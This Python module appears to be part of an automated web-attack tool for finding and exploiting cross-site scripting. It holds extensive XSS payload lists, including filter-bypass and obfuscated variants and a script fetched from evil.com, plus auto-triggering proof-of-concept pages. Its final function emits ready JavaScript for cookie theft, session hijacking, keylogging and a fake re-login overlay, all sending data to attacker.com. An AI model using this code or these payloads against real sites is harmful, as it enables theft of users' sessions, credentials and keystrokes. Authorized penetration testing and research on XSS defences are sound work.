"""XSS (Cross-Site Scripting) module for automated testing with filter bypasses

This module implements:
- Reflected, Stored, and DOM-based XSS testing
- Multiple encoding schemes and obfuscation techniques
- Non-standard HTML tags and event handlers
- Filter bypass payloads
- Proof-of-concept generation
"""

import re
from dataclasses import dataclass, field
from enum import Enum
from typing import Dict, List, Optional, Tuple
from urllib.parse import quote, unquote

from src.vulnchain.core.request_handler import RequestHandler, Response
from src.vulnchain.core.payload_engine import PayloadEngine


class XSSType(Enum):
    """Types of XSS vulnerabilities"""
    
    REFLECTED = "reflected"  # Reflected XSS
    STORED = "stored"  # Stored XSS
    DOM_BASED = "dom_based"  # DOM-based XSS
    UNKNOWN = "unknown"


class XSSTechnique(Enum):
    """XSS testing techniques"""
    
    BASIC = "basic"  # Basic payloads
    ENCODED = "encoded"  # Encoded payloads
    OBFUSCATED = "obfuscated"  # Obfuscated payloads
    TAG_ATTRIBUTE = "tag_attribute"  # Tag attribute injection
    EVENT_HANDLER = "event_handler"  # Event handler injection
    FILTER_BYPASS = "filter_bypass"  # Filter bypass techniques


@dataclass
class InjectionPoint:
    """Represents a potential XSS injection point"""
    
    parameter: str
    location: str  # query, post, header, cookie, body
    original_value: str
    url: str
    method: str = "GET"
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[Dict[str, str]] = None
    body: Optional[str] = None


@dataclass
class XSSResult:
    """Result of XSS testing"""
    
    injection_point: InjectionPoint
    is_vulnerable: bool
    xss_type: Optional[XSSType] = None
    technique: Optional[XSSTechnique] = None
    payload: Optional[str] = None
    confidence: float = 0.0
    output: Optional[str] = None
    evidence: List[str] = field(default_factory=list)
    metadata: Dict = field(default_factory=dict)
    poc_html: Optional[str] = None


class XSSTester:
    """XSS detection and exploitation with filter bypasses"""
    
    # Basic XSS payloads
    BASIC_PAYLOADS = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
    ]
    
    # Non-standard tags and event handlers for filter bypass
    NON_STANDARD_TAGS = [
        "<marquee onstart=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video src=x onerror=alert(1)>",
        "<audio src=x onerror=alert(1)>",
        "<embed src=x onerror=alert(1)>",
        "<object data=javascript:alert(1)>",
        "<isindex type=image src=x onerror=alert(1)>",
        "<form><button formaction=javascript:alert(1)>X</button>",
        "<math><mi xlink:href=javascript:alert(1)>X</mi>",
        "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    ]
    
    # Event handlers for bypass
    EVENT_HANDLERS = [
        "onload", "onerror", "onclick", "onmouseover", "onfocus",
        "onblur", "onchange", "onsubmit", "onkeydown", "onkeyup",
        "onmouseenter", "onmouseleave", "ondblclick", "oncontextmenu",
        "ondrag", "ondrop", "onscroll", "onwheel", "onanimationstart",
        "onanimationend", "ontransitionend", "onbegin", "onstart",
        "ontoggle", "onpointerover", "onpointerenter",
    ]
    
    # Encoding bypass payloads
    ENCODED_PAYLOADS = [
        # HTML entity encoding
        "&#60;script&#62;alert(1)&#60;/script&#62;",
        "&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;",
        # URL encoding
        "%3Cscript%3Ealert(1)%3C/script%3E",
        # Double URL encoding
        "%253Cscript%253Ealert(1)%253C/script%253E",
        # Unicode encoding
        "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
        # Mixed encoding
        "&#60;scr<script>ipt>alert(1)</scr</script>ipt>",
    ]
    
    # Obfuscation techniques
    OBFUSCATED_PAYLOADS = [
        # Case variation
        "<ScRiPt>alert(1)</sCrIpT>",
        "<IMG SRC=x OnErRoR=alert(1)>",
        # Null bytes
        "<script>alert(1)</script>",
        # Comments
        "<scr<!--comment-->ipt>alert(1)</scr<!---->ipt>",
        # Newlines and tabs
        "<script\n>alert(1)</script>",
        "<script\t>alert(1)</script>",
        # Backticks
        "<img src=x onerror=`alert(1)`>",
        # String concatenation
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        # Eval
        "<script>eval(atob('YWxlcnQoMSk='))</script>",  # alert(1) base64
        # Template literals
        "<script>alert`1`</script>",
    ]
    
    # Filter bypass techniques
    FILTER_BYPASS_PAYLOADS = [
        # Bypass keyword filters
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        "<img src=x onerror=al\\u0065rt(1)>",
        "<svg/onload=alert(1)>",
        "<svg onload=alert&#40;1&#41;>",
        # Bypass space filters
        "<img/src=x/onerror=alert(1)>",
        "<img\tsrc=x\tonerror=alert(1)>",
        "<img\nsrc=x\nonerror=alert(1)>",
        # Bypass quote filters
        "<img src=x onerror=alert(1)>",
        "<img src='x' onerror='alert(1)'>",
        "<img src=\"x\" onerror=\"alert(1)\">",
        # Bypass parentheses filters
        "<svg onload=alert`1`>",
        "<img src=x onerror=alert.call(null,1)>",
        # Bypass dot filters
        "<img src=x onerror=alert(1)>",
        "<img src=x onerror=window['alert'](1)>",
        # Protocol handlers
        "<a href=javascript:alert(1)>click</a>",
        "<a href=data:text/html,<script>alert(1)</script>>click</a>",
        # Polyglot payloads
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    ]
    
    # DOM-based XSS payloads
    DOM_PAYLOADS = [
        # Location-based
        "#<img src=x onerror=alert(1)>",
        "#<script>alert(1)</script>",
        # document.write sinks
        "<img src=x onerror=alert(document.domain)>",
        # innerHTML sinks
        "<img src=x onerror=alert(document.cookie)>",
        # eval sinks
        "';alert(1)//",
        "\";alert(1)//",
        # jQuery sinks
        "<img src=x onerror=$.getScript('//evil.com/xss.js')>",
    ]

    def __init__(
        self,
        request_handler: RequestHandler,
        payload_engine: Optional[PayloadEngine] = None,
    ):
        """Initialize XSS tester
        
        Args:
            request_handler: Request handler for HTTP communication
            payload_engine: Optional payload engine for wordlists
        """
        self.request_handler = request_handler
        self.payload_engine = payload_engine or PayloadEngine()
        self._load_default_payloads()
    
    def _load_default_payloads(self):
        """Load default XSS payloads"""
        # Add basic payloads
        for payload in self.BASIC_PAYLOADS:
            self.payload_engine.add_custom_payload(payload, "xss_basic")
        
        # Add non-standard tag payloads
        for payload in self.NON_STANDARD_TAGS:
            self.payload_engine.add_custom_payload(payload, "xss_nonstandard")
        
        # Add encoded payloads
        for payload in self.ENCODED_PAYLOADS:
            self.payload_engine.add_custom_payload(payload, "xss_encoded")
        
        # Add obfuscated payloads
        for payload in self.OBFUSCATED_PAYLOADS:
            self.payload_engine.add_custom_payload(payload, "xss_obfuscated")
        
        # Add filter bypass payloads
        for payload in self.FILTER_BYPASS_PAYLOADS:
            self.payload_engine.add_custom_payload(payload, "xss_bypass")
        
        # Add DOM payloads
        for payload in self.DOM_PAYLOADS:
            self.payload_engine.add_custom_payload(payload, "xss_dom")
    
    async def test_injection_point(
        self,
        injection_point: InjectionPoint,
        techniques: Optional[List[XSSTechnique]] = None,
    ) -> List[XSSResult]:
        """Test an injection point for XSS
        
        Args:
            injection_point: The injection point to test
            techniques: List of techniques to use (default: all)
        
        Returns:
            List of XSS results
        """
        if techniques is None:
            techniques = list(XSSTechnique)
        
        results = []
        
        # Test each technique
        for technique in techniques:
            if technique == XSSTechnique.BASIC:
                result = await self._test_basic_xss(injection_point)
            elif technique == XSSTechnique.ENCODED:
                result = await self._test_encoded_xss(injection_point)
            elif technique == XSSTechnique.OBFUSCATED:
                result = await self._test_obfuscated_xss(injection_point)
            elif technique == XSSTechnique.TAG_ATTRIBUTE:
                result = await self._test_tag_attribute_xss(injection_point)
            elif technique == XSSTechnique.EVENT_HANDLER:
                result = await self._test_event_handler_xss(injection_point)
            elif technique == XSSTechnique.FILTER_BYPASS:
                result = await self._test_filter_bypass_xss(injection_point)
            else:
                continue
            
            if result:
                results.append(result)
                
                # If we found a vulnerability, we can stop testing
                if result.is_vulnerable:
                    break
        
        return results
    
    async def _test_basic_xss(
        self, injection_point: InjectionPoint
    ) -> Optional[XSSResult]:
        """Test for basic XSS
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            XSSResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        
        # Test each basic payload
        for payload in self.BASIC_PAYLOADS:
            # Construct injection payload
            injection_payload = payload
            
            # Send request with payload
            response = await self._send_request(injection_point, injection_payload)
            response_text = response.text
            
            # Check if payload appears unescaped in response
            is_xss, xss_type = self._detect_xss(
                payload,
                response_text,
                baseline_text,
                injection_point,
            )
            
            if is_xss:
                # Generate PoC
                poc_html = self._generate_poc(injection_point, payload)
                
                return XSSResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    xss_type=xss_type,
                    technique=XSSTechnique.BASIC,
                    payload=payload,
                    confidence=0.95,
                    output=response_text[:500],
                    evidence=[
                        f"XSS vulnerability detected: {xss_type.value}",
                        f"Payload: {payload}",
                        "Payload appears unescaped in response",
                        f"Injection point: {injection_point.parameter}",
                    ],
                    poc_html=poc_html,
                )
        
        # No vulnerability found
        return XSSResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=XSSTechnique.BASIC,
            confidence=0.0,
        )
    
    async def _test_encoded_xss(
        self, injection_point: InjectionPoint
    ) -> Optional[XSSResult]:
        """Test for encoded XSS
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            XSSResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        
        # Test each encoded payload
        for payload in self.ENCODED_PAYLOADS:
            # Send request with encoded payload
            response = await self._send_request(injection_point, payload)
            response_text = response.text
            
            # Check if payload appears unescaped in response
            is_xss, xss_type = self._detect_xss(
                payload,
                response_text,
                baseline_text,
                injection_point,
            )
            
            if is_xss:
                # Generate PoC
                poc_html = self._generate_poc(injection_point, payload)
                
                return XSSResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    xss_type=xss_type,
                    technique=XSSTechnique.ENCODED,
                    payload=payload,
                    confidence=0.90,
                    output=response_text[:500],
                    evidence=[
                        f"Encoded XSS vulnerability detected: {xss_type.value}",
                        f"Payload: {payload}",
                        "Encoded payload bypassed filters",
                        f"Injection point: {injection_point.parameter}",
                    ],
                    poc_html=poc_html,
                )
        
        # No vulnerability found
        return XSSResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=XSSTechnique.ENCODED,
            confidence=0.0,
        )

    async def _test_obfuscated_xss(
        self, injection_point: InjectionPoint
    ) -> Optional[XSSResult]:
        """Test for obfuscated XSS
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            XSSResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        
        # Test each obfuscated payload
        for payload in self.OBFUSCATED_PAYLOADS:
            # Send request with obfuscated payload
            response = await self._send_request(injection_point, payload)
            response_text = response.text
            
            # Check if payload appears unescaped in response
            is_xss, xss_type = self._detect_xss(
                payload,
                response_text,
                baseline_text,
                injection_point,
            )
            
            if is_xss:
                # Generate PoC
                poc_html = self._generate_poc(injection_point, payload)
                
                return XSSResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    xss_type=xss_type,
                    technique=XSSTechnique.OBFUSCATED,
                    payload=payload,
                    confidence=0.90,
                    output=response_text[:500],
                    evidence=[
                        f"Obfuscated XSS vulnerability detected: {xss_type.value}",
                        f"Payload: {payload}",
                        "Obfuscated payload bypassed filters",
                        f"Injection point: {injection_point.parameter}",
                    ],
                    poc_html=poc_html,
                )
        
        # No vulnerability found
        return XSSResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=XSSTechnique.OBFUSCATED,
            confidence=0.0,
        )
    
    async def _test_tag_attribute_xss(
        self, injection_point: InjectionPoint
    ) -> Optional[XSSResult]:
        """Test for XSS in tag attributes
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            XSSResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        
        # Attribute context payloads
        attribute_payloads = [
            "\" onload=alert(1) x=\"",
            "' onload=alert(1) x='",
            "\" onerror=alert(1) x=\"",
            "' onerror=alert(1) x='",
            "\"><script>alert(1)</script><x=\"",
            "'><script>alert(1)</script><x='",
            "\" autofocus onfocus=alert(1) x=\"",
            "' autofocus onfocus=alert(1) x='",
        ]
        
        # Test each attribute payload
        for payload in attribute_payloads:
            # Send request with attribute payload
            response = await self._send_request(injection_point, payload)
            response_text = response.text
            
            # Check if payload appears unescaped in response
            is_xss, xss_type = self._detect_xss(
                payload,
                response_text,
                baseline_text,
                injection_point,
            )
            
            if is_xss:
                # Generate PoC
                poc_html = self._generate_poc(injection_point, payload)
                
                return XSSResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    xss_type=xss_type,
                    technique=XSSTechnique.TAG_ATTRIBUTE,
                    payload=payload,
                    confidence=0.95,
                    output=response_text[:500],
                    evidence=[
                        f"Tag attribute XSS vulnerability detected: {xss_type.value}",
                        f"Payload: {payload}",
                        "Payload broke out of attribute context",
                        f"Injection point: {injection_point.parameter}",
                    ],
                    poc_html=poc_html,
                )
        
        # No vulnerability found
        return XSSResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=XSSTechnique.TAG_ATTRIBUTE,
            confidence=0.0,
        )
    
    async def _test_event_handler_xss(
        self, injection_point: InjectionPoint
    ) -> Optional[XSSResult]:
        """Test for XSS using non-standard event handlers
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            XSSResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        
        # Test non-standard tags with various event handlers
        for payload in self.NON_STANDARD_TAGS:
            # Send request with event handler payload
            response = await self._send_request(injection_point, payload)
            response_text = response.text
            
            # Check if payload appears unescaped in response
            is_xss, xss_type = self._detect_xss(
                payload,
                response_text,
                baseline_text,
                injection_point,
            )
            
            if is_xss:
                # Generate PoC
                poc_html = self._generate_poc(injection_point, payload)
                
                return XSSResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    xss_type=xss_type,
                    technique=XSSTechnique.EVENT_HANDLER,
                    payload=payload,
                    confidence=0.90,
                    output=response_text[:500],
                    evidence=[
                        f"Event handler XSS vulnerability detected: {xss_type.value}",
                        f"Payload: {payload}",
                        "Non-standard event handler bypassed filters",
                        f"Injection point: {injection_point.parameter}",
                    ],
                    poc_html=poc_html,
                )
        
        # No vulnerability found
        return XSSResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=XSSTechnique.EVENT_HANDLER,
            confidence=0.0,
        )
    
    async def _test_filter_bypass_xss(
        self, injection_point: InjectionPoint
    ) -> Optional[XSSResult]:
        """Test for XSS using filter bypass techniques
        
        Args:
            injection_point: The injection point to test
        
        Returns:
            XSSResult if vulnerability found, None otherwise
        """
        # Get baseline response
        baseline_response = await self._send_request(injection_point, injection_point.original_value)
        baseline_text = baseline_response.text
        
        # Test filter bypass payloads
        for payload in self.FILTER_BYPASS_PAYLOADS:
            # Send request with bypass payload
            response = await self._send_request(injection_point, payload)
            response_text = response.text
            
            # Check if payload appears unescaped in response
            is_xss, xss_type = self._detect_xss(
                payload,
                response_text,
                baseline_text,
                injection_point,
            )
            
            if is_xss:
                # Generate PoC
                poc_html = self._generate_poc(injection_point, payload)
                
                return XSSResult(
                    injection_point=injection_point,
                    is_vulnerable=True,
                    xss_type=xss_type,
                    technique=XSSTechnique.FILTER_BYPASS,
                    payload=payload,
                    confidence=0.95,
                    output=response_text[:500],
                    evidence=[
                        f"Filter bypass XSS vulnerability detected: {xss_type.value}",
                        f"Payload: {payload}",
                        "Filter bypass technique successful",
                        f"Injection point: {injection_point.parameter}",
                    ],
                    poc_html=poc_html,
                )
        
        # No vulnerability found
        return XSSResult(
            injection_point=injection_point,
            is_vulnerable=False,
            technique=XSSTechnique.FILTER_BYPASS,
            confidence=0.0,
        )

    def _detect_xss(
        self,
        payload: str,
        response_text: str,
        baseline_text: str,
        injection_point: InjectionPoint,
    ) -> Tuple[bool, XSSType]:
        """Detect XSS in response
        
        Args:
            payload: The injected payload
            response_text: Response text to analyze
            baseline_text: Baseline response text
            injection_point: The injection point
        
        Returns:
            Tuple of (is_xss, xss_type)
        """
        # Check if payload appears unescaped in response
        # Look for key XSS indicators
        xss_indicators = [
            "<script>",
            "onerror=",
            "onload=",
            "onfocus=",
            "onclick=",
            "onmouseover=",
            "javascript:",
            "alert(",
        ]
        
        # Normalize payload for comparison
        payload_lower = payload.lower()
        response_lower = response_text.lower()
        baseline_lower = baseline_text.lower()
        
        # Check if any XSS indicator from payload appears in response
        for indicator in xss_indicators:
            if indicator in payload_lower:
                # Check if this indicator appears in response but not in baseline
                if indicator in response_lower and indicator not in baseline_lower:
                    # Found XSS indicator in response!
                    
                    # Determine XSS type
                    xss_type = self._determine_xss_type(
                        payload,
                        response_text,
                        injection_point,
                    )
                    
                    return True, xss_type
        
        # Check if payload appears verbatim (or mostly verbatim) in response
        # This handles cases where the payload is reflected without execution
        if self._is_payload_reflected(payload, response_text, baseline_text):
            # Payload is reflected - check if it's in a dangerous context
            if self._is_dangerous_context(payload, response_text):
                xss_type = self._determine_xss_type(
                    payload,
                    response_text,
                    injection_point,
                )
                return True, xss_type
        
        return False, XSSType.UNKNOWN
    
    def _is_payload_reflected(
        self, payload: str, response_text: str, baseline_text: str
    ) -> bool:
        """Check if payload is reflected in response
        
        Args:
            payload: The injected payload
            response_text: Response text
            baseline_text: Baseline response text
        
        Returns:
            True if payload is reflected, False otherwise
        """
        # Check for exact match
        if payload in response_text and payload not in baseline_text:
            return True
        
        # Check for partial match (at least 50% of payload)
        payload_parts = payload.split()
        if len(payload_parts) > 1:
            for part in payload_parts:
                if len(part) > 5 and part in response_text and part not in baseline_text:
                    return True
        
        # Check for HTML-encoded version
        import html
        encoded_payload = html.escape(payload)
        if encoded_payload in response_text and encoded_payload not in baseline_text:
            # Payload is reflected but HTML-encoded - not vulnerable
            return False
        
        return False
    
    def _is_dangerous_context(self, payload: str, response_text: str) -> bool:
        """Check if payload is in a dangerous context
        
        Args:
            payload: The injected payload
            response_text: Response text
        
        Returns:
            True if in dangerous context, False otherwise
        """
        # Find payload in response
        payload_index = response_text.find(payload)
        if payload_index == -1:
            return False
        
        # Extract context around payload
        context_start = max(0, payload_index - 100)
        context_end = min(len(response_text), payload_index + len(payload) + 100)
        context = response_text[context_start:context_end]
        
        # Check for dangerous contexts
        dangerous_patterns = [
            r"<script[^>]*>.*?" + re.escape(payload),  # Inside script tag
            r"<[^>]+\s+on\w+=['\"]?" + re.escape(payload),  # In event handler
            r"<[^>]+\s+href=['\"]?javascript:" + re.escape(payload),  # In javascript: URL
            r"<[^>]+\s+src=['\"]?" + re.escape(payload),  # In src attribute
        ]
        
        for pattern in dangerous_patterns:
            if re.search(pattern, context, re.IGNORECASE):
                return True
        
        return False
    
    def _determine_xss_type(
        self, payload: str, response_text: str, injection_point: InjectionPoint
    ) -> XSSType:
        """Determine the type of XSS
        
        Args:
            payload: The injected payload
            response_text: Response text
            injection_point: The injection point
        
        Returns:
            XSSType
        """
        # Check for DOM-based XSS indicators
        dom_indicators = [
            "document.location",
            "document.URL",
            "document.referrer",
            "window.location",
            "location.hash",
            "location.search",
        ]
        
        for indicator in dom_indicators:
            if indicator in response_text.lower():
                return XSSType.DOM_BASED
        
        # Check if this is a POST request (more likely to be stored)
        if injection_point.method.upper() == "POST":
            # Could be stored XSS
            # We'd need to verify by checking if payload persists
            # For now, assume reflected
            return XSSType.REFLECTED
        
        # Default to reflected XSS
        return XSSType.REFLECTED
    
    def _generate_poc(self, injection_point: InjectionPoint, payload: str) -> str:
        """Generate proof-of-concept HTML
        
        Args:
            injection_point: The injection point
            payload: The successful payload
        
        Returns:
            PoC HTML string
        """
        if injection_point.location == "query":
            # Generate PoC for query parameter
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
            
            parsed = urlparse(injection_point.url)
            params = parse_qs(parsed.query)
            params[injection_point.parameter] = [payload]
            new_query = urlencode(params, doseq=True)
            poc_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            
            poc_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - {injection_point.parameter}</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <p>Vulnerable parameter: <strong>{injection_point.parameter}</strong></p>
    <p>Payload: <code>{payload}</code></p>
    <p>Click the link below to trigger the XSS:</p>
    <a href="{poc_url}" target="_blank">Trigger XSS</a>
    
    <h2>Automatic Trigger</h2>
    <p>The XSS will be triggered automatically in 3 seconds...</p>
    <script>
        setTimeout(function() {{
            window.location.href = "{poc_url}";
        }}, 3000);
    </script>
</body>
</html>"""
            
        elif injection_point.location == "post":
            # Generate PoC for POST parameter
            data_fields = ""
            if injection_point.data:
                for key, value in injection_point.data.items():
                    if key == injection_point.parameter:
                        data_fields += f'    <input type="hidden" name="{key}" value="{payload}">\n'
                    else:
                        data_fields += f'    <input type="hidden" name="{key}" value="{value}">\n'
            else:
                data_fields = f'    <input type="hidden" name="{injection_point.parameter}" value="{payload}">\n'
            
            poc_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - {injection_point.parameter}</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <p>Vulnerable parameter: <strong>{injection_point.parameter}</strong></p>
    <p>Payload: <code>{payload}</code></p>
    <p>Click the button below to trigger the XSS:</p>
    
    <form action="{injection_point.url}" method="POST" id="xssForm">
{data_fields}
        <button type="submit">Trigger XSS</button>
    </form>
    
    <h2>Automatic Trigger</h2>
    <p>The XSS will be triggered automatically in 3 seconds...</p>
    <script>
        setTimeout(function() {{
            document.getElementById('xssForm').submit();
        }}, 3000);
    </script>
</body>
</html>"""
        
        else:
            # Generic PoC
            poc_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>XSS PoC - {injection_point.parameter}</title>
</head>
<body>
    <h1>XSS Proof of Concept</h1>
    <p>Vulnerable parameter: <strong>{injection_point.parameter}</strong></p>
    <p>Location: <strong>{injection_point.location}</strong></p>
    <p>Payload: <code>{payload}</code></p>
    <p>Manual exploitation required for this injection point.</p>
</body>
</html>"""
        
        return poc_html

    async def _send_request(
        self, injection_point: InjectionPoint, value: str
    ) -> Response:
        """Send request with injected value
        
        Args:
            injection_point: The injection point
            value: The value to inject
        
        Returns:
            Response object
        """
        if injection_point.location == "query":
            # Inject into URL query parameter
            from urllib.parse import urlencode, urlparse, parse_qs, urlunparse
            
            parsed = urlparse(injection_point.url)
            params = parse_qs(parsed.query)
            params[injection_point.parameter] = [value]
            new_query = urlencode(params, doseq=True)
            new_url = urlunparse((
                parsed.scheme,
                parsed.netloc,
                parsed.path,
                parsed.params,
                new_query,
                parsed.fragment,
            ))
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=new_url,
                headers=injection_point.headers,
            )
        
        elif injection_point.location == "post":
            # Inject into POST data
            data = injection_point.data.copy() if injection_point.data else {}
            data[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                data=data,
            )
        
        elif injection_point.location == "body":
            # Inject into request body
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                data=value,
            )
        
        elif injection_point.location == "header":
            # Inject into header
            headers = injection_point.headers.copy()
            headers[injection_point.parameter] = value
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=headers,
                data=injection_point.data,
            )
        
        elif injection_point.location == "cookie":
            # Inject into cookie
            cookies = {injection_point.parameter: value}
            
            return await self.request_handler.send_request(
                method=injection_point.method,
                url=injection_point.url,
                headers=injection_point.headers,
                cookies=cookies,
                data=injection_point.data,
            )
        
        else:
            raise ValueError(f"Unsupported injection location: {injection_point.location}")


class XSSPoCGenerator:
    """Proof-of-concept generator for XSS vulnerabilities"""
    
    def __init__(self):
        """Initialize PoC generator"""
        pass
    
    def generate_poc(
        self,
        injection_point: InjectionPoint,
        payload: str,
        xss_type: XSSType,
    ) -> str:
        """Generate comprehensive PoC
        
        Args:
            injection_point: The vulnerable injection point
            payload: The successful payload
            xss_type: Type of XSS vulnerability
        
        Returns:
            PoC HTML string
        """
        # Use the tester's PoC generation
        tester = XSSTester(None)
        return tester._generate_poc(injection_point, payload)
    
    def generate_exploit_script(
        self,
        injection_point: InjectionPoint,
        payload: str,
        xss_type: XSSType,
    ) -> str:
        """Generate exploit script
        
        Args:
            injection_point: The vulnerable injection point
            payload: The successful payload
            xss_type: Type of XSS vulnerability
        
        Returns:
            JavaScript exploit code
        """
        exploit_js = f"""// XSS Exploit Script
// Vulnerable parameter: {injection_point.parameter}
// XSS Type: {xss_type.value}
// Payload: {payload}

// Cookie stealer
function stealCookies() {{
    var cookies = document.cookie;
    var exfil_url = 'https://attacker.com/steal?cookies=' + encodeURIComponent(cookies);
    
    // Send cookies to attacker server
    fetch(exfil_url, {{
        method: 'GET',
        mode: 'no-cors'
    }});
    
    // Alternative: use image tag
    var img = new Image();
    img.src = exfil_url;
}}

// Session hijacking
function hijackSession() {{
    var sessionData = {{
        cookies: document.cookie,
        localStorage: JSON.stringify(localStorage),
        sessionStorage: JSON.stringify(sessionStorage),
        url: window.location.href,
        referrer: document.referrer
    }};
    
    var exfil_url = 'https://attacker.com/hijack?data=' + encodeURIComponent(JSON.stringify(sessionData));
    
    fetch(exfil_url, {{
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(sessionData)
    }});
}}

// Keylogger
function startKeylogger() {{
    var keys = [];
    
    document.addEventListener('keypress', function(e) {{
        keys.push({{
            key: e.key,
            timestamp: Date.now()
        }});
        
        // Send keys every 10 keystrokes
        if (keys.length >= 10) {{
            var exfil_url = 'https://attacker.com/keys?data=' + encodeURIComponent(JSON.stringify(keys));
            fetch(exfil_url, {{ method: 'GET', mode: 'no-cors' }});
            keys = [];
        }}
    }});
}}

// Phishing overlay
function showPhishingOverlay() {{
    var overlay = document.createElement('div');
    overlay.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;';
    
    var form = document.createElement('div');
    form.style.cssText = 'position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);background:white;padding:20px;border-radius:5px;';
    form.innerHTML = `
        <h2>Session Expired</h2>
        <p>Please re-enter your credentials:</p>
        <input type="text" id="phish_user" placeholder="Username" style="display:block;margin:10px 0;padding:5px;width:200px;">
        <input type="password" id="phish_pass" placeholder="Password" style="display:block;margin:10px 0;padding:5px;width:200px;">
        <button onclick="submitPhishing()" style="padding:5px 20px;">Login</button>
    `;
    
    overlay.appendChild(form);
    document.body.appendChild(overlay);
}}

function submitPhishing() {{
    var user = document.getElementById('phish_user').value;
    var pass = document.getElementById('phish_pass').value;
    
    var exfil_url = 'https://attacker.com/phish?user=' + encodeURIComponent(user) + '&pass=' + encodeURIComponent(pass);
    fetch(exfil_url, {{ method: 'GET', mode: 'no-cors' }});
    
    // Remove overlay
    document.querySelector('div[style*="position:fixed"]').remove();
}}

// Execute exploit
// Uncomment the desired exploit:
// stealCookies();
// hijackSession();
// startKeylogger();
// showPhishingOverlay();
"""
        
        return exploit_js
